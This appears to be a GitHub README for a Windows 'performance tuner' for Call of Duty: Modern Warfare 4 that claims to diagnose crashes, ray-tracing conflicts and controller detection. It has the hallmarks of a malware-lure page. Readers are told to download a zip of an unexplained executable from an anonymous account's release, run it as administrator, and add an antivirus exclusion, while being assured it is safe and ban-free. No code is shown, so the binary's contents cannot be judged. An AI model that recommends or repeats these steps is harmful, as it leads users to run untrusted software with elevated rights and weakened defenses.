# MW4 Performance Tuner

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop diagnostic utility for Call of Duty: Modern Warfare 4 — detects ray tracing conflicts, prevents Kernelbase crashes, and resolves controller detection issues.

<div align="center">

[![Download MW4 Performance Tuner v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-32CD32?style=for-the-badge&logoColor=white)](https://github.com/HarmonicHornet76/mw4-performance-tuner-2026/releases/tag/1.0.0)

</div>

---

## 📋 Overview

Modern Warfare 4 launched in early access on October 16, 2026, and the campaign is already plagued by technical issues. Two problems dominate player reports: **Kernelbase.dll crashes** that make missions unplayable, and **ray tracing disabling DLSS/FSR/XeSS entirely**. A third issue — controllers not being recognized on PC — affects players using Steam Input or DS4Windows.

**MW4 Performance Tuner** is a desktop diagnostic utility that scans your system and game configuration, identifies these conflicts, and recommends fixes. It does not modify game files or inject code — it only reads configuration and system data.

**Who it's for:** MW4 players on PC who want to diagnose crashes, understand the ray tracing trade-off, and fix controller detection issues without digging through forum threads.

---

## 🧩 Capabilities

### Ray Tracing Conflict Detection
- Detects current RT setting in `configs.user.ini`
- Warns when DLSS/FSR/XeSS are locked out by RT
- Suggests presets: "RT off + DLSS on" for frame rate, "RT on + native" for image quality
- Estimates VRAM usage based on settings and GPU tier

### Kernelbase Crash Prevention
- Scans crash logs for `KERNELBASE.dll` patterns
- Detects the known trigger: ray tracing enabled during campaign missions
- Recommends RT toggle if crash pattern matches
- Provides launcher-specific file verification steps

### Controller Diagnostic
- Checks if controller is detected by Windows
- Identifies conflicts with Steam Input, DS4Windows, reWASD, and overlays
- Guides through disabling input interceptors
- Verifies game detects controller after fixes

### Config Backup
- Saves `configs.user.ini` and related files before changes
- Timestamped backups for rollback
- One-click restore

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 8 GB | 16 GB |
| **Storage** | 100 MB | 200 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Game** | MW4 installed (Steam/Battle.net) | Latest patch |
| **Permissions** | Administrator | Administrator |

---

## 🔧 Installation

1. Download `MW4-Performance-Tuner-v1.0.0.zip` using the button above
2. Extract with 7-Zip or WinRAR
3. Right-click `MW4Tuner.exe` and select **Run as administrator**
4. Select your MW4 installation folder
5. Click **Scan** — the tuner checks config, logs, and input devices
6. Review findings and apply recommended fixes

---

## ❓ FAQ

**Does this modify the game or affect anti-cheat?**
No — the tuner only reads configuration files and system data. It does not modify game files, inject code, or interact with RICOCHET. All changes are made through the game's own settings or by toggling options manually.

**Will I get banned for using this?**
No — this is a diagnostic utility that runs as a separate process. It does not interact with the game client or anti-cheat systems. Activision's RICOCHET has had false positives before, but they were caused by in-game behavior, not external diagnostic tools.

**Why does ray tracing disable DLSS?**
This is a deliberate design choice in MW4. When RT is enabled, the "Resolution Scaling Technique" menu becomes inactive and the game forces native rendering with Filmic SMAA T2X. The trade-off is maximum clarity at the cost of frame rate.

**Is there a fix for the Kernelbase crash?**
The known workaround is disabling ray tracing. PCGH tested this and it resolved crashes that occurred reproducibly at mission 3. Driver updates and file verification did not help in their testing.

**Do I need to disable my antivirus?**
Some antivirus suites may flag diagnostic tools that read game configs as a precaution. Add an exclusion for the tuner folder if needed.

**How do I uninstall?**
Run `MW4Tuner.exe --uninstall` — it removes the tuner and its registry entries without touching your game files.

---

## 🗺️ Roadmap — 2026

- [ ] Automatic GPU detection and preset recommendation
- [ ] Crash log analysis with pattern database
- [ ] Multi-language support
- [ ] Community-shared configuration profiles
- [ ] Cloud backup for settings

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download MW4 Performance Tuner v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-32CD32?style=for-the-badge&logoColor=white)](https://github.com/HarmonicHornet76/mw4-performance-tuner-2026/releases/tag/1.0.0)

**Version 1.0.0** — Stable Release · Crash Prevention · RT Diagnostics · MIT

</div>
